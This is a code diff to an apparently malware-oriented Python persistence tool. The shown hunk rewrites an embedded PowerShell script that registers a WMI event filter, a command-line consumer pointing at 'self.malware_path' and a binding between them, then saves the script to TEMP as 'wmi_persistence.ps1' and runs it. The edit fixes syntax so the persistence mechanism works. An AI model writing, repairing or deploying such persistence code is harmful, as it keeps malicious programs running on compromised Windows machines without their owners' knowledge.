@@ -1,4 +1,3 @@
-
 import os
 import sys
 import platform
@@ -556,22 +555,26 @@ sleep $((RANDOM % 60))
             # This is an advanced technique using WMI event subscriptions
             # It triggers execution on specific system events
             
-            script_content = f"""$filterArgs = @{{
-                Name = 'StartupFilter'
-                EventNameSpace = 'root\\cimv2'
-                QueryLanguage = 'WQL'
-                Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"
-            }}
+            # Create PowerShell script using string concatenation to avoid syntax issues
+            script_lines = [
+                '$filterArgs = @{',
+                '    Name = "StartupFilter"',
+                '    EventNameSpace = "root\\cimv2"',
+                '    QueryLanguage = "WQL"',
+                '    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA \'Win32_Process\'"',
+                '}',
+                '',
+                f'$consumerArgs = @{{',
+                f'    Name = "StartupConsumer"',
+                f'    CommandLineTemplate = "{self.malware_path}"',
+                '}',
+                '',
+                '$filter = Set-WmiInstance -Class __EventFilter -Namespace root/subscription -Arguments $filterArgs',
+                '$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription -Arguments $consumerArgs',
+                'Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subscription -Arguments @{Filter=$filter; Consumer=$consumer}'
+            ]
             
-            $consumerArgs = @{{
-                Name = 'StartupConsumer'
-                CommandLineTemplate = "{self.malware_path}"
-            }}
-            
-            $filter = Set-WmiInstance -Class __EventFilter -Namespace root/subscription -Arguments $filterArgs
-            $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription -Arguments $consumerArgs
-            Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subscription -Arguments @{{Filter=$filter; Consumer=$consumer}}
-            """
+            script_content = '\n'.join(script_lines)
             
             # Save and execute PowerShell script
             ps_script = os.path.join(os.environ['TEMP'], 'wmi_persistence.ps1')
@@ -969,4 +972,3 @@ if __name__ == "__main__":
         print(f"Watchdog: {'Enabled' if persistence.watchdog_enabled else 'Disabled'}")
     else:
         print("\nFailed to add persistence")
-
